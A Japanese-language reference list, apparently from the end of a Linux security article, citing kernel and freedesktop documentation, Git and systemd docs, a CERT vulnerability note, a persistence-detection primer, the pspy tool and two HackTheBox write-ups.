- [21] [binfmt_misc — Linux Kernel ドキュメント](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME アプリケーションの関連付け](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info 仕様](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry 仕様](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig 言語](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache の脆弱性](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` ドキュメント](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` ドキュメント](https://git-scm.com/docs/git-ls-tree)
- [33] [Git 設定ドキュメント](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator のドキュメント](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: 永続化メカニズム](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
